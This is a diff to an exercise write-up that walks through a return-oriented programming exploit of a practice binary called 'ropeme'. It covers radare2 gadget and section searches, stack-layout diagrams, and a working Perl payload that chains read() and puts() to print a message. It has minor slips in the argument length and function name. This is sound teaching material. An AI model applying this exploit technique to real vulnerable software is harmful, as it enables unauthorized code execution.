@@ -2,6 +2,9 @@
 Write-up
 ========
 
+This writeup is made on linux using radare2 tools a lot. You may want to use
+another platform or tools but I won't bother supporting them.
+
 Exercise 1
 ==========
 
@@ -278,4 +281,151 @@ puts() but what about the "getting the message" part? The program provides
 read(), and we can make use of it.
 
 The read system call takes as argument a file descriptor, an address to write
-to and a length.
+to and a length. We will read from stdin (file descriptor 0). Our message
+will be a traditional "Hello World!" which is of length 13 with the null
+terminator.
+
+So we need to call read, store our string somewhere, and call puts to print
+it. The stack will look somewhat like:
+
+::
+
+    ^ [string address]
+    | [end    address]
+    | [string len    ]
+    | [string address]
+    | [stdin  fd     ]
+    | [puts   address]
+    | [read   address]
+    | [padding       ]
+
+However, if we do that when returning from write the argument for puts will
+be stdin file descriptor! We need to find a way to clean the stack removing
+the three arguments of write.
+
+This is done using a gadget, a small but useful sequence of instructions
+present at the end of a function. Here we want something to pop three
+arguments off the stack. Let's use radare2 to find something like that.
+
+::
+
+    $ r2 ropeme
+     -- Do you want to print 333.5K chars? (y/N)
+    [0x08048360]> /R pop
+        ...
+
+      0x080485d8             5b  pop ebx
+      0x080485d9             5e  pop esi
+      0x080485da             5f  pop edi
+      0x080485db             5d  pop ebp
+      0x080485dc             c3  ret
+
+        ...
+
+Better than what we needed! We will only use the last three pops. Returning
+to 0x080485d9 will clear the stack of its three last elements then return
+normally to the next function. I will refer to that address as pppr for
+"pop pop pop ret". Our stack now looks like that:
+
+::
+
+    ^ [string address]
+    | [end    address] = 0x0804851c
+    | [puts   address] = 0x08048330
+    | [string len    ] = 0x0000000e
+    | [string address]
+    | [stdin  fd     ] = 0x00000000
+    | [pppr   address] = 0x080485d9
+    | [read   address] = 0x08048320
+    | [padding       ] = 'A' x 92
+
+The only thing we lack is an address to write to. We need to find a section
+in memory which is more than 14 bytes large and has Read-Write permissions.
+We can use radare2 for that:
+
+::
+
+    $ rabin2 -S ropeme | grep "perm=..rw"
+    idx=17 vaddr=0x080497cc paddr=0x000007cc sz=4 vsz=4 perm=--rw- name=.init_array
+    idx=18 vaddr=0x080497d0 paddr=0x000007d0 sz=4 vsz=4 perm=--rw- name=.fini_array
+    idx=19 vaddr=0x080497d4 paddr=0x000007d4 sz=4 vsz=4 perm=--rw- name=.jcr
+    idx=20 vaddr=0x080497d8 paddr=0x000007d8 sz=232 vsz=232 perm=--rw- name=.dynamic
+    idx=21 vaddr=0x080498c0 paddr=0x000008c0 sz=4 vsz=4 perm=--rw- name=.got
+    idx=22 vaddr=0x080498c4 paddr=0x000008c4 sz=32 vsz=32 perm=--rw- name=.got.plt
+    idx=23 vaddr=0x080498e4 paddr=0x000008e4 sz=8 vsz=8 perm=--rw- name=.data
+    idx=24 vaddr=0x080498ec paddr=0x000008ec sz=4 vsz=4 perm=--rw- name=.bss
+    idx=30 vaddr=0x080497cc paddr=0x000007cc sz=288 vsz=4096 perm=m-rw- name=phdr1
+    idx=31 vaddr=0x08048000 paddr=0x00000000 sz=52 vsz=52 perm=m-rw- name=ehdr
+
+Most sections are too small... The .dynamic seems large enough to be
+interesting though. We'll use it.
+
+::
+
+    ^ [string address] = 0x080497d8
+    | [end    address] = 0x0804851c
+    | [puts   address] = 0x08048330
+    | [string len    ] = 0x0000000d
+    | [string address] = 0x080497d8
+    | [stdin  fd     ] = 0x00000000
+    | [pppr   address] = 0x080485d9
+    | [read   address] = 0x08048320
+    | [padding       ] = 'A' x 92
+
+Let's try that!
+
+::
+
+    $ perl - <<EOF | ./ropeme admin42
+    print "A" x 92
+    . "\x20\x83\x04\x08"
+    . "\xd9\x85\x04\x08"
+    . "\x00\x00\x00\x00"
+    . "\xd8\x97\x04\x08"
+    . "\x0e\x00\x00\x00"
+    . "\x30\x83\x04\x08"
+    . "\x1c\x85\x04\x08"
+    . "\xd8\x97\x04\x08"
+    EOF
+    Enter password:
+    [...]
+    Wrong password
+    Segmentation fault
+
+Hmm... It didn't work... The reason is that the first call to read (to get
+the password) reads 512 bytes from the standard input so it goes in the way
+of the other call to read. The solution is to completely fill it and put our
+input just after:
+
+::
+    | [padding       ] = 'B' x 388
+    | [string address] = 0x080497d8
+    | [end    address] = 0x0804851c
+    | [puts   address] = 0x08048330
+    | [string len    ] = 0x0000000d
+    | [string address] = 0x080497d8
+    | [stdin  fd     ] = 0x00000000
+    | [pppr   address] = 0x080485d9
+    | [read   address] = 0x08048320
+    | [padding       ] = 'A' x 92
+
+    $ perl - <<EOF | ./ropeme admin42
+    print "A" x 92
+    . "\x20\x83\x04\x08"
+    . "\xd9\x85\x04\x08"
+    . "\x00\x00\x00\x00"
+    . "\xd8\x97\x04\x08"
+    . "\x0e\x00\x00\x00"
+    . "\x30\x83\x04\x08"
+    . "\x1c\x85\x04\x08"
+    . "\xd8\x97\x04\x08"
+    . "B" x 388
+    . "Hello World!\x00"
+    EOF
+    Enter password:
+    [...]
+    Wrong password
+    Hello World!
+    Segmentation fault
+
+Working!
